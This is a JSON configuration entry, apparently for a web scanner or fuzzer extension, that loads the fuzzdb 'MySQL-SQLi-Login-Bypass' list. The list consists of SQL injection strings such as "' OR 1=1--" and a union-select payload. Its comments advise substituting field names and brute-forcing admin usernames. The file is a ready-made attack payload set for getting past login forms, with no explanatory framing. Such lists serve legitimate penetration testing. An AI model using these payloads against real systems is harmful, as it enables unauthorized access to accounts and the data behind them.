[
 {
  "Name": "MySQL-SQLi-Login-Bypass.fuzzdb", 
  "Active": true, 
  "Scanner": 1, 
  "Payloads": [
   "# regex replace as many as you can with your fuzzer for best results:", 
   "# <user-fieldname> <pass-fieldname> <username>", 
   "# also try to brute force a list of possible usernames, including possile admin acct names", 
   "<username>' OR 1=1--", 
   "'OR '' = '\tAllows authentication without a valid username.", 
   "<username>'--", 
   "' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--", 
   "'OR 1=1--"
  ], 
  "Encoder": [], 
  "UrlEncode": false, 
  "CharsToUrlEncode": "", 
  "SearchString": "", 
  "ReplaceString": "", 
  "Grep": [
   "error"
  ], 
  "PayloadResponse": false, 
  "NotResponse": false, 
  "NotCookie": false, 
  "CaseSensitive": false, 
  "ExcludeHTTP": false, 
  "OnlyHTTP": false, 
  "IsContentType": false, 
  "ContentType": "", 
  "IsResponseCode": false, 
  "ResponseCode": "", 
  "MatchType": 1, 
  "IssueName": "MySQL-SQLi-Login-Bypass.fuzzdb", 
  "IssueSeverity": "Information", 
  "IssueConfidence": "Certain", 
  "IssueDetail": "MySQL-SQLi-Login-Bypass.fuzzdb\n\n<grep>", 
  "RemediationDetail": "", 
  "IssueBackground": "", 
  "RemediationBackground": ""
 }
]